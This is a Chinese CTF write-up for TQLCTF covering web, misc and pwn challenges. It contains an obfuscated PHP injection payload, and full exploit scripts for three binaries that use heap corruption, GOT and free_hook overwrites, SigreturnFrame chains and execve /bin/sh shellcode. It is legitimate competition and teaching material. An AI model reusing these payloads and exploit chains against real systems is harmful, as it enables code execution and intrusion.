![image-20220221210613235](https://cdn.jsdelivr.net/gh/whitegive111/photo/img/image-20220221210613235.png)

# TQLCTF

# Web

## Simple PHP

```Bash
user=a%29%2F*&pass=a%29%2F*&website=*%2Fscandir();%2F*&punctuation=*/;$_="%8C%86%8C%8B%9A%92";$__="%ff%ff%ff%ff%ff%ff%ff";$___=$_^$__;$____="%9C%9E%8B%DF%D0%99%D5";$_____="%ff%ff%ff%ff%ff%ff%ff%ff";$______=$____^$_____;$___($______);%3b/*
```



# Misc

## 签到

看源码即可

<p>可恶的出题人把flag藏起来了，不过还可以参加抽奖</p><section><img class="rich_pages wxw-img" data-ratio="4.14625" data-src="https://mmbiz.qpic.cn/mmbiz_jpg/RicNZQMn3FU432ibcxcefKcNLqarW4NFEMHsR9ibHW8INbUQibUGnnX9oXhUHdoM6NMjPdkSjdYJicYuFdFwVlc4InQ/640?wx_fmt=jpeg" data-type="jpeg" data-w="800"  /></section><p><br  /></p><section draggable="false" data-tools-id="66482"><section style="margin: 10px auto;width: 400px;"><section draggable="false" data-tools-id="78209"><section style="overflow: hidden;padding:10px;"><section><p style="text-align: center;margin: 0px;font-size: 16px;">还是被你发现了<br  />TQLCTF{cbe33c52-a4b8-4753-a5d8-8b72b1ab3bb5}</p></section><svg width="100%" height="40em" style="margin-top: -40rem;"><rect width="100%" height="40em" x="0" y="0" style="width: 100%;fill: #fdfdfd;"><animate attributename="height" begin="click" dur="0.3" data-365editor-dur="dur写几秒，动画就持续执行几秒" fill="freeze" values="40em;-400em;40em" data-ipaiban-fill="fill指是否还原初始状态，freeze为不恢复"></animate></rect></svg></section></section></section></section><p><br  /></p>

​                </div>

## Wordle

很容易看懂该源码意思即为猜单词,猜对即为绿色,猜错但是在答案列表(顺序不对)为黄色,完全错误为白色。而要得到flag即要结果为5个绿色。即该次输入需要猜测值完全正确,而mode的值决定了猜测的次数,mode=0时每个单词猜测次数为999999999,mode>0时,猜测次数为7-mode。而随机数在4,288,675,840中产生,为一个10位数。如果需要猜测正确,需要知道产生的随机数%4090的值

需要正确提交512次才能得到flag

首先从mode 0开始打，由于mode 可以猜999999999次，是必中的，然后根据反馈的颜色稍微剪枝一下去搜索，打两次mode 0，凑够624个32位的随机数，就有一定概率能预测后面的随机数（有概率是因为random库的源码表示，当randrange调用randbelow函数，而randbelow函数利用getrandbits，虽然getrandbits是可预测的，但是randbelow这样计算：

```Python
def _randbelow(self, n, int=int, maxsize=1<<BPF, type=type,
                   Method=_MethodType, BuiltinMethod=_BuiltinMethodType):
        "Return a random int in the range [0,n).  Raises ValueError if n==0."

        random = self.random
        getrandbits = self.getrandbits
        # Only call self.getrandbits if the original random() builtin method
        # has not been overridden or if a new getrandbits() was supplied.
        if type(random) is BuiltinMethod or type(getrandbits) is Method:
            k = n.bit_length()  # don't use (n-1) here because n can be 1
            r = getrandbits(k)          # 0 <= r < 2**k
            while r >= n:
                r = getrandbits(k)
            return r
        # There's an overridden random() method but no new getrandbits() method,
        # so we can only use random() from here.
        if n >= maxsize:
            _warn("Underlying random() generator does not supply \n"
                "enough bits to choose from a population range this large.\n"
                "To remove the range limitation, add a getrandbits() method.")
            return int(random() * n)
        rem = maxsize % n
        limit = (maxsize - rem) / maxsize   # int(limit * maxsize) % n == 0
        r = random()
        while r >= limit:
            r = random()
        return int(r*maxsize) % n
```

但是后面发现可以直接使用randcrack函数预测,但具有一定概率性,多试几次

```Python
from pwn import *
from randcrack import RandCrack

with open('valid_words.txt', 'r') as f:
	valid_words = [x.strip() for x in f.readlines()]
rc = RandCrack()
count = 0
GREEN = b'\033[42m  \033[0m'
io = remote('47.106.102.129', 22127)
io.recvuntil(b'> ')
io.sendline(b'0')
for _ in range(512):
	io.recvuntil(b'Round')
	io.recvuntil(b': ')
	fake_id = io.recvuntil(b'\n')[1:-1]
	io.recvuntil(b'> ')
	fucked = ['','']
	for i in range(4090):
		if fucked[0] != '' or fucked[1] != '':
			if fucked[0] != '' and valid_words[i][0] != fucked[0]:
				continue
			elif fucked[1] != '' and valid_words[i][1] != fucked[1]:
				continue
		io.sendline(valid_words[i].encode())
		mark=io.recvuntil(b'\n')
		for k in range(2):
			if mark[12 * k + 11:12 * k + 22] == GREEN and fucked[k] != valid_words[i][k]:
				fucked[k] = valid_words[i][k]
		if b'Correct'  in mark:
			fake = i
			break
	t = int(fake_id, 16) ^ fake
	rc.submit(t * 4090 + fake)
	count+= 1
io.recvuntil(b'> ')
io.sendline(b'0')
for _ in range(512):
	io.recvuntil(b'Round')
	io.recvuntil(b': ')
	fake_id = p.recvuntil(b'\n')[1:-1]
	io.recvuntil(b'> ')
	if count == 624:
		id = rc.predict_randrange(0, 4090 * (2 ** 20))
		p.sendline(valid_words[id % 4090].encode())
		continue
	fucked = ['0', '0']
	for i in tqdm(range(4090)):
		if fucked[0] != '' or fucked[1] != '':
			if fucked[0] != '' and valid_words[i][0] != fucked[0]:
				continue
			elif fucked[1] != '' and valid_words[i][1] != fucked[1]:
				continue
		io.sendline(valid_words[i].encode())
		mark=io.recvuntil(b'\n')
		for k in range(2):
			if mark[12 * k + 11:12 * k + 22] == GREEN and fucked[k] != valid_words[i][k]:
				fucked[k] = valid_words[i][k]
		if b'Correct'  in mark:
			fake = i
			break
	if count < 624:
		t = int(fake_id , 16) ^ fake
		rc.submit(t * 4090 + fake)
		count += 1
io.recvuntil(b'> ')
io.sendline(b'3')
for _ in range(1000):
	true_id = rc.predict_randrange(0, 4090 * (2 ** 20))
	io.recvuntil(b'> ')
	io.sendline(valid_words[true_id % 4090].encode())
io.interactive()

```

##  Wizard 

直接暴力，一直猜138，直到猜中为止

```Python
from pwn import *
MSG=b"You are wrong! You can not get Zard's secret!\n"
while MSG==b"You are wrong! You can not get Zard's secret!\n":
    context.log_level = 'debug'
    s=remote("120.79.12.160",47242)

    s.recvuntil(b"starts with ")
    proof=s.recvuntil(b'\n')
    proof=proof.decode()
    proof=proof.replace('\n','')
    print(len(proof))
    print(proof)
    import hashlib
    Data=''
    L=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
    res=''
    for i in range(len(L)):
        for j in range(len(L)):
            for k in range(len(L)):
                for m in range(len(L)):
                    data ='TQLCTF'+ L[i]+L[j]+L[k]+L[m]
                    sha = hashlib.sha256()
                    sha.update(data.encode())
                    res = sha.hexdigest()
                    if res[:5] == proof:
                        Data=data[6:]
                        break
                if res[:5] == proof:
                    break
            if res[:5] == proof:
                break
        if res[:5] == proof:
            break
    Data+='\n'
    s.sendafter(b'Please input the string:',Data.encode())
    s.recvuntil(b"Let's start!\n")
    s.recvuntil(b'n = ')
    n=s.recvuntil(b', ')
    n=int(n[:4])
    s.recvuntil(b'm = ')
    m=s.recvuntil(b'\n')
    m=int(m[:-1])
    s.send(b'G 138\n')
    MSG=s.recvline()
print(MSG)
```

##  Ranma½ 

vim打开,可以看到正常形式的单词,感觉是替换,都试一试,维吉尼亚爆破得到正确flag

## the Ohio State University

下载好附件发现是一个.osz后缀得文件，作为一个音游人联想到出题者是否对谱面进行了修改。首先把osz文件打开后发现有图片和源音游谱面的名字，去官网下载对比了一下文件内容：

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=YzFmZWZhNTQwMWU3ODRkNmM4N2YwZmQ5OWVjNmM5MjBfUGdHMGtyVW1VNGJyclpMRWY3aTRER245a1RZU3NZcVhfVG9rZW46Ym94Y25KQ09WVDRKT0YzS1J3MFZyVFNPYmNmXzE2NDU0MzkwMzg6MTY0NTQ0MjYzOF9WNA)

发现有四个文件被进行过更改，对第一个图片文件进行分析，看了看pwd在属性中被备注了出来：

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmY5ZWEyYjdkYWE1NDBhZGY1MzYyZTJkNDYzMWY3YzBfMnpSY3hCOXBQRFZIWkQxMWpkRkdEVUFQNTNtdXk4bDBfVG9rZW46Ym94Y25jcjVvVEhsR0xrZndUYzFHN3pvMEJlXzE2NDU0MzkwMzg6MTY0NTQ0MjYzOF9WNA)

发现其实steghide隐写，解出得到第一部分FLAG：

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=MTJhZjY1MTJhNzcyNDMyY2JjYWQyNzY5OTQ3NDY2ZGZfN0g3dU9zeXFxb1laS0tvdGQ2TFFyRUVYc2t0UXR6VU5fVG9rZW46Ym94Y25RT0g4OW5jUmdDN3ppTFd0eXRLQlJoXzE2NDU0MzkwMzg6MTY0NTQ0MjYzOF9WNA)

紧接着查看boom，发现是wav文件，猜测是silenteye隐写，发现BASIC文件里含有WAVPAWD：

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=MmE1NDBjNjU3OGRlMzZjMjdiODg5ZTY4M2MxOGNjZjRfQ1F3eHUzdWtkbUo1ZThkbjh0SHhmeXU3QUdNNGprVVBfVG9rZW46Ym94Y25KdlQ5VTZrb0dQeWxUbGNHMElVTGNmXzE2NDU0MzkwMzg6MTY0NTQ0MjYzOF9WNA)

用silenteye解一下得到第二部分FLAG：

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=MzFmZTg0ODA3OWIxMjIxZjVlMTRlM2UzNTcwMzZiNGZfa0FrRkd1d0VXMm51cDBudVBMSnQ3SmZ4SVo3eGd4bTFfVG9rZW46Ym94Y25JdldsSkt1WEZna2xwNzY5bERkU3pjXzE2NDU0MzkwMzg6MTY0NTQ0MjYzOF9WNA)

最后研究VIVID难度的文件，用OSU!打开这个谱面发现有很多重复，谱面为4个打击框一组，每组可保留四个打击块，猜测这些打击块和空白组成01二进制，

![img](https://rvu5pcz1il.feishu.cn/space/api/box/stream/download/asynccode/?code=YTgxZjhhMjFiOWU0YzUxYWJlZWFhZmYwMDhhZDI2ODlfdnZGQXdVaUhTNWNxbDF6ZTZlYnpZa2pMM0FyNEZzUkJfVG9rZW46Ym94Y245elN0V044cW42UWphSmZGVEM3WnJkXzE2NDU0MzkwMzg6MTY0NTQ0MjYzOF9WNA)

依次转化最后发现重复最多的组合

110101 1001000 1101111 1010111 1110100 1001001 1101101 1100101 1111101

转换为文本则为5HoWtIme}

将三段拼接起来即为flag

## 问卷

好耶,签到三血

# Pwn

## **unbelievable_write**

利用一次漏洞free，控制tcache_struct

利用fastbin reverse into tcache 写值，调用后门

```Apache
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.terminal=['tmux', 'splitw', '-h']
# prog = '../bin/pwn'
prog = '/home/ctf/pwn'
#elf = ELF(prog)#nc 121.36.194.21 49155
# p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
# libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")
p = remote("119.23.255.127", 21377)#nc 124.71.130.185 49155
# p = remote("127.0.0.1", 9999)#nc 124.71.130.185 49155
def debug(addr,PIE=True): 
        debug_str = ""
        if PIE:
                text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
                for i in addr:
                        debug_str+='b *{}\n'.format(hex(text_base+i))
                gdb.attach(p,debug_str) 
        else:
                for i in addr:
                        debug_str+='b *{}\n'.format(hex(i))
                gdb.attach(p,debug_str) 

def dbg():
        gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send((data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), (data)) 
sl      = lambda data               :p.sendline((data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), (data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))

        
def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def choice(idx):
        sla("> ",str(idx))

def add(sz,con):
    choice(1)
    sleep(0.1)
    sl(str(sz))
    sleep(0.1)
    sl(con)
    # sa("content?",cno)

def delete(idx):
        choice(2)
        sleep(0.1)
        sl(str(idx))


def exp():
        # debug([0x4013FD],0)
    add(0x90,p64(0)*3+p64(0x410))
    add(0x280,'a')
    
    for i in range(16):
        add(i*0x10+0xa0,(p64(0)+p64(0x4d1)+p64(0)+p64(0x21)+(p64(0)+p64(0x61))*((i*0x10+0x70)/0x10)))
    delete(-0x290)
    fake_t = p16(7)*8*3
    choice(2)
    add(0x280,fake_t)
        # for i in range(3):
                # add(i*0x10+0x30,p64(0)+p64(0x4c1)+p64(0)+p64(0x4a1))        
        # choice(2)
        # add(0xa0,'a')
    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*8+p8(0xe0)
    add(0x280,fake_t)
        # add(0x50,'a')
    add(0x90,'a')
        #---------------------------------------------
    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*10+p8(0xc0)
    add(0x280,fake_t)        
    add(0xb0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*11+p8(0x80)
    add(0x280,fake_t)        
    add(0xc0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*12+p8(0x50)
    add(0x280,fake_t)        
    add(0xd0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*13+p8(0x30)
    add(0x280,fake_t)        
    add(0xe0,'a')


    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*14+p8(0x20)
    add(0x280,fake_t)        
    add(0xf0,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*15+p8(0x20)
    add(0x280,fake_t)        
    add(0x100,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*16+p8(0x30)
    add(0x280,fake_t)        
    add(0x110,'a')

    fake_t = p16(7)*8*4+p16(1)*8*4+p64(0)*40
    add(0x280,fake_t)        


    pay = 0x3d0*'a'+p64(0)+p64(0x21)+p64(0x404070)[0:6]

    add(0x400,pay)

    add(0x10,'a')
    # dbg()
    
    # debug([0x4014a2],0)
    
    # choice(3)

    it()
if __name__ == '__main__':
        exp()
```



## **nemu**

set x存在越界读写，先利用堆结构泄露libc，再修改free_指针指向got表，添加断点的时候就可以改got表，改readline为one拿shell  

```Python
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal=['tmux', 'splitw', '-h']
prog = './nemu'
#elf = ELF(prog)#nc 121.36.194.21 49155
#p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("./libc-2.23.so")
p = remote("47.107.29.210",20943)#nc 124.71.130.185 49155
def debug(addr,PIE=True): 
        debug_str = ""
        if PIE:
                text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
                for i in addr:
                        debug_str+='b *{}\n'.format(hex(text_base+i))
                gdb.attach(p,debug_str) 
        else:
                for i in addr:
                        debug_str+='b *{}\n'.format(hex(i))
                gdb.attach(p,debug_str) 

def dbg():
        gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send((data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), (data)) 
sl      = lambda data               :p.sendline((data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), (data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))

        
def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def choice(idx):
        sla("(nemu) ",str(idx))

def info(chi):
    choice('info '+chi)
        
    # sa("content?",cno)

def sis(n):
        choice('si '+str(n))

def xmem(n,addr):
        choice('x '+str(n)+" "+(addr))

def set(addr,val):
        choice('set '+ str(addr)+' ' + str(val))
        # sla("Index: ",idx)

def exp():
    
    

        #debug([0x7B9])

    info('r')
    # set()
    # set(0xffffffffffff,0x01234d0)
    pmem = 0x6a3b80

    sis(7)
    xmem(10,str(8000030))
    ru("0x08000040\t0x")
    heap = int(r(8),16) + 0x9c8c000 - 0x9c8d130
    lg('heap',heap)


    xmem(10,hex(heap+0x1508-pmem)[2:])
    ru("\t0x")
    low = int(r(8),16)
    ru("\t0x")
    high = int(r(8),16)*0x100000000
    # lg('higi',high)
    # lg('low',low)
    data = high+low
    lg('data',data)

    addr = data - 0x00007f651f1a9ce8 + 0x00007f651ede5000
    lg('addr',addr)

    fh = 0x60f0a8
    one = addr + 0x4527a # 0x45226 0xf03a4 0xf1247
    #=============================
    set(0x86A3FC0-pmem, fh-0x30)
    set(0x86A3FC0-pmem + 4, (fh-0x30)>>32)
    raw_input()
    sla("(nemu) ",'w 0x'+hex(one)[6:])

    
    lg('one',one)


    # set(pay,1)
    # dbg()
    # choice('set '+pay)

    it()
if __name__ == '__main__':
        exp()


# cmd_table [] = {
#   { "help", "Display informations about all supported commands", cmd_help },
#   { "c", "Continue the execution of the program", cmd_c },
#   { "q", "Exit NEMU", cmd_q },
#   { "si", "Execute the step by one", cmd_si},

#   /* TODO: Add more commands */
#   { "info", "Show all the regester' information", cmd_info },
#   { "x", "Show the memory things", cmd_x },
#   { "p", "Show varibeals and numbers", cmd_p },
#   { "w", "Set the watch point", cmd_w },
#   { "d", "Delete the watch point", cmd_d },
#   {"set", "Set memory", cmd_set}
# };
```





## **ezvm**

strcpy上溢出，改tcache fd指向free_hook,改free_hook为setcontext orw

```Python
# _*_ coding:utf-8 _*_
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal=['tmux', 'splitw', '-h']
prog = './easyvm'
#elf = ELF(prog)#nc 121.36.194.21 49155
#p = process(prog)#,env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF("./libc-2.31.so")
p = remote("120.24.82.252",23089)#nc 124.71.130.185 49155
def debug(addr,PIE=True): 
        debug_str = ""
        if PIE:
                text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16) 
                for i in addr:
                        debug_str+='b *{}\n'.format(hex(text_base+i))
                gdb.attach(p,debug_str) 
        else:
                for i in addr:
                        debug_str+='b *{}\n'.format(hex(i))
                gdb.attach(p,debug_str) 

def dbg():
        gdb.attach(p)
#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send((data))        #in case that data is an int
sa      = lambda delim,data         :p.sendafter(str(delim), (data)) 
sl      = lambda data               :p.sendline((data)) 
sla     = lambda delim,data         :p.sendlineafter(str(delim), (data)) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
it      = lambda                    :p.interactive()
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))
bp      = lambda bkp                :pdbg.bp(bkp)
li      = lambda str1,data1         :log.success(str1+'========>'+hex(data1))

        
def dbgc(addr):
        gdb.attach(p,"b*" + hex(addr) +"\n c")

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
bss_base = 0x7FFFFFFEF000
bss2_base = 0x7FFFFFFEF000 + 0x1000

code = ''
def read(idx, ptr, sz):
    global code
    code += asm(
        '''
            mov eax,0
            mov edi,{}
            mov rsi,{}
            mov edx,{}
            syscall  
        '''.format(idx, ptr, sz)
    )
def write(idx, ptr, sz):
    global code
    code += asm(
        '''
            mov eax,1
            mov edi,{}
            mov rsi,{}
            mov edx,{}
            syscall  
        '''.format(idx, ptr, sz)
    )
def close(idx):
    global code
    code += asm(
        '''
            mov eax,3
            mov edi,{}
            syscall  
        '''.format(idx)
    )

def set_bss(addr, content):
    global code
    length = len(content)
    for i in range(length//8 + 1):
        try:
            code += asm(
                '''
                    mov rdi, {}
                    mov rsi, {}
                    mov qword ptr[rdi], rsi

                '''.format(addr + 8*i, u64(content[8*i : 8*i+8]))
            )   
        except:
            if length%8 != 0 :
                code += asm(
                    '''
                        mov rdi, {}
                        mov rsi, {}
                        mov qword ptr[rdi], rsi

                    '''.format(addr + 8*i, u32(content[8*i :]))
                )   

def alloc(name,  sz):
    global code
    set_bss(bss_base, name)
    code += asm(
        '''
            mov eax,2
            mov rdi,{}
            mov rsi,{}
            syscall  
        '''.format(bss_base, sz)
    )

def exp():
    global code
    #debug([0x2207,0x1b7d, 0x1720])
    alloc('aaaa',0x400)#3
    read(3, bss2_base, 0x8)
    # leak libc        free_hook
    #     bss2_base       +8
    #
    code += asm(
        '''
            mov rax, {}
            mov rbx, qword ptr[rax]
            sub rbx, 0x1ec1f0
            mov qword ptr[rax], rbx
        '''.format(bss2_base)
    )
    code += asm(
        '''
            mov rax, {}
            mov rbx, qword ptr[rax]
            add rbx, {}
            mov qword ptr[rax+8], rbx
        '''.format(bss2_base,libc.sym['__free_hook'])
    )
    code += asm(
        '''
            mov rax, {}
            mov rbx, qword ptr[rax]
            add rbx, {}
            mov qword ptr[rax+0x10], rbx
        '''.format(bss2_base,libc.sym['system'])
    )
    write(6, bss2_base, 0x8)
    alloc('bbbb',0xa0)#4
    alloc('cccc',0xe8)#5
    alloc('d'*0x18,0xe8)#6
    alloc('eeee',0xe8)#7
    
    close(7)
    close(5)

    write(6,bss2_base+8,8)

    alloc('ffff',0xe8)#5
    alloc('gggg',0xe8)#7

    read(3, bss2_base+0x18, 0x18)
    
    code += asm(
        '''
            mov rax, {}
            mov rbx, qword ptr[rax]
            add rbx, {}
            mov qword ptr[rax], rbx
        '''.format(bss2_base+0x28,1584)
    )

    write(1, bss2_base+0x28, 0x8)
    write(1, bss2_base, 0x8)
    read(3, bss2_base+0x18, 0x18)

    read(0, bss2_base+0x100, 0xe8)
    write(7, bss2_base+0x100, 0xe8)
    sla('Send your code:\n', code+'\x00')
    #############
    ru('Emulate i386 code\n')
    leak_heap = uu64(r(8)) + 0x210
    lg('heap',leak_heap)
    leak_libc = uu64(r(8))
    setcontext = leak_libc + libc.sym['setcontext'] + 61
    mprotect = leak_libc + libc.sym['mprotect'] 
    lg('libc',leak_libc)    

    ######
    gadgets =leak_libc + 0x154930
    
    orw = shellcraft.open('./flag',0)
    orw += shellcraft.read('rax','rsp',0x40)
    orw += shellcraft.write(1,'rsp',0x40)

    sigframe = SigreturnFrame()
    sigframe.rdi = (leak_heap) & (~0xfff)
    sigframe.rsp = (leak_heap+0xb0)
    sigframe.rsi = 0x2000
    sigframe.rdx = 7
    sigframe.rip = mprotect
    code2 = p64(gadgets) + p64(leak_heap) + p64(0) + p64(setcontext)
    code2 +=p64(setcontext)+asm(orw)+str(sigframe)[0x68:0xb0]
    code2 += p64(leak_heap+0x28)
    sl(code2)

    it()
if __name__ == '__main__':
        exp()
```

# 